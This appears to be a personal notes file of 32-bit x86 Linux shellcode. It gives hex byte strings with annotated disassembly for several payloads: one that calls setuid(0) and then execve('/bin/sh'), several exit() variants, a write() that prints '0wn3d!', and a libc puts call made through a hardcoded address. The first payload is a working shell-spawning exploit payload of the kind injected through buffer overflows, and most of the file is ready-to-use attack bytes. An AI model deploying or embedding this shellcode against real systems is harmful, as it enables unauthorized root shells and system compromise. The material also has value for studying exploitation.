
execute /bin/sh
---------------

$shellcode = "\x31\xc0\x31\xdb\xb0\x17\xcd\x80" .
 "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" .
 "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" .
 "\x80\xe8\xdc\xff\xff\xff/bin/sh";

xor    %eax,%eax
xor    %ebx,%ebx
mov    $0x17,%al	# setuid syscall
int    $0x80
jmp    0xbffff589 	# jump to call
pop    %esi 		# call pushed address of /bin/sh to stack
mov    %esi,0x8(%esi) 	# mov address to after /bin/sh
xor    %eax,%eax 	# set eax to 0
mov    %al,0x7(%esi) 	# mov 0 to end of /bin/sh string
mov    %eax,0xc(%esi) 	# mov 0 to end of array for execv
mov    $0xb,%al 	# mov 11 to eax -> execv syscall
mov    %esi,%ebx 	# mov address of /bin/sh string to ebx
lea    0x8(%esi),%ecx 	# load address of pointer to argv
lea    0xc(%esi),%edx 	# load address of NULL
int    $0x80 		# do syscall
xor    %ebx,%ebx 	# set ebx to 0
mov    %ebx,%eax 	# mov 0 to eax
inc    %eax 		# inc eax => 1 -> exit syscall
int    $0x80 		# do syscall
call   0xbffff56a
/bin/sh



execute exit()
--------------

exit(0)

$shellcode = "\x31\xdb\x89\xd8\x40\xcd\x80";

xor    %ebx,%ebx 	# set ebx to 0
mov    %ebx,%eax 	# mov 0 to eax
inc    %eax 		# inc eax => 1 -> exit syscall
int    $0x80 		# do syscall

exit(1)

$shellcode = "\x31\xdb\x89\xd8\x43\x40\xcd\x80";

8048382:       31 db                   xor    %ebx,%ebx
8048384:       89 d8                   mov    %ebx,%eax
8048386:       43                      inc    %ebx
8048387:       40                      inc    %eax
8048388:       cd 80                   int    $0x80

exit(139)

$shellcode = "\x31\xdb\x89\xd8\xb3\x8b\x40\xcd\x80";

8048382:       31 db                   xor    %ebx,%ebx
8048384:       89 d8                   mov    %ebx,%eax
8048386:       b3 8b                   mov    $0x8b,%bl
8048388:       40                      inc    %eax
8048389:       cd 80                   int    $0x80



execute write()
--------------

$shellcode = "\xeb\x15\x59\x31\xd2\xb2\x07\x31\xdb\x89\xd8\xb0\x04\x43\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xe6\xff\xff\xff\x0wn3d!\n";

 8048382:       eb 15                   jmp    8048399 <end>

08048384 <begin>:
 8048384:       59                      pop    %ecx # address of the string got pushed by call onto the stack
 8048385:       31 d2                   xor    %edx,%edx # set edx = 0
 8048387:       b2 07                   mov    $0x7,%dl # load length = 7 of string into edx
 8048389:       31 db                   xor    %ebx,%ebx
 804838b:       89 d8                   mov    %ebx,%eax
 804838d:       b0 04                   mov    $0x4,%al # load 4 -> write syscall to eax
 804838f:       43                      inc    %ebx # set ebx = 1 -> stdout
 8048390:       cd 80                   int    $0x80
 8048392:       31 db                   xor    %ebx,%ebx # prepare and call exit syscall
 8048394:       89 d8                   mov    %ebx,%eax
 8048396:       40                      inc    %eax
 8048397:       cd 80                   int    $0x80

08048399 <end>:
 8048399:       e8 e6 ff ff ff          call   8048384 <begin>
 804839e:       30 77 6e                xor    %dh,0x6e(%edi) # string 0wn3d!
 80483a1:       33 64 21 0a             xor    0xa(%ecx),%esp # string 0wn3d!



execute printf("0wn3d libc style!")
-----------------------------------

$shellcode = "\xeb\x0e\xb8\x40\x83\x04\x08\xff\xd0\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xed\xff\xff\xff0wn3d libc style!\n\x00";

 80483c1:       eb 0e                   jmp    80483d1 <end>

080483c3 <begin>:
 80483c3:       b8 d4 82 04 08          mov    $0x80482d4,%eax
 80483c8:       ff d0                   call   *%eax
 80483ca:       31 db                   xor    %ebx,%ebx
 80483cc:       89 d8                   mov    %ebx,%eax
 80483ce:       40                      inc    %eax
 80483cf:       cd 80                   int    $0x80

080483d1 <end>:
 80483d1:       e8 ed ff ff ff          call   80483c3 <begin>

---------------------------------------------------------------------------------------------------------------------
$shellcode = "\xeb\x0d\xff\x15\x40\x83\x04\x08\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xee\xff\xff\xff0wn3d libc style!\n\0";

 80483c1:       eb 0c                   jmp    80483cf <end>
-> eb 0d

080483c3 <begin>:
 80483c3:       e8 0c ff ff ff          call   80482d4 <puts@plt>

-> this has to be an absolute call

-> ff 15 40 83 04 08 -> 1 byte longer than relative call

 80483c8:       31 db                   xor    %ebx,%ebx
 80483ca:       89 d8                   mov    %ebx,%eax
 80483cc:       40                      inc    %eax
 80483cd:       cd 80                   int    $0x80

080483cf <end>:
 80483cf:       e8 ef ff ff ff          call   80483c3 <begin>
-> e8 ee ff ff ff

 80483d4:       30 77 6e                xor    %dh,0x6e(%edi)
 80483d7:       33 64 20 6c             xor    0x6c(%eax),%esp
 80483db:       69 62 63 20 73 74 79    imul   $0x79747320,0x63(%edx),%esp
 80483e2:       6c                      insb   (%dx),%es:(%edi)
 80483e3:       65 21 00                and    %eax,%gs:(%eax)
---------------------------------------------------------------------------------------------------------------------
